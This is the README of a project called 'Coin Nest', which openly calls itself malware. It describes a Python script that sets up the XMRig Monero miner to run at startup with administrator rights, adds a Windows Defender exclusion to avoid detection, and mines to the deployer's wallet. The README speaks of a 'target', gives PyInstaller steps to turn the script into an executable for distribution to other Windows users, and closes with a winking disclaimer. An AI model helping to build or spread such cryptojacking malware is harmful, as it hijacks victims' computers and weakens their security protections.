# Coin Nest

## Description
This is a piece of malware. This script ensures that XMRig runs on startup with administrative privileges, adds an exclusion path for Windows Defender to prevent it from flagging XMRig as malware, and configures XMRig to start mining Monero to the specific monero adress, which you can change in code.

## Prerequisites
Before running this script, ensure that you're target has the following:
- Python 3.x installed on your system. `[Unless you build it as an exectuable]`
- Internet connectivity to download XMRig.
- Administrative privileges on your Windows system.

## Instructions

1. **Clone the Repository:** Clone or download this repository to your local machine.

2. **Open Command Prompt as Administrator:** Right-click on the Command Prompt application and choose "Run as administrator" to ensure that you have administrative privileges.

3. **Navigate to the Repository Directory:** Use the `cd` command to navigate to the directory where you cloned or downloaded this repository.

4. **Install Required Python Modules:**
   - Open a Command Prompt window as administrator.
   - Run the following command to install the required Python modules:
     ```
     pip install winreg ctypes
     ```

## Building to an Executable
If you want to convert the Python script to an executable (.exe) file for easier distribution, you can use tools like PyInstaller or cx_Freeze. Here's a general outline of how to do this:

1. **Install PyInstaller or cx_Freeze:** You can install either of these tools using pip:
     ```
     pip install pyinstaller
     OR
     pip install cx_Freeze
     ```

2. **Build the Executable:**
- For PyInstaller, use the following command to create an executable:
  ```
  pyinstaller --onefile main.py
  ```

- For cx_Freeze, you'll need to create a setup script. Refer to the cx_Freeze documentation for more information on how to do this.

3. **Distribute the Executable:** You can now distribute the generated executable to other Windows users for easy execution.

## Running the Executable
You should exchange {adress} with your specified xmr adress, this will edit the config to send the xmr mined to your adress.

- The Executable
  ```
  ./MYEXE {adress}
  ```
- The Script
  ```
  python main.py {adress}
  ```

## Disclaimer
Please note that cryptocurrency mining may have legal and ethical implications in your region. Ensure that you have the necessary permissions and comply with local regulations before using this script. Use this script responsibly and only on systems you own or have explicit permission to use for mining. ;)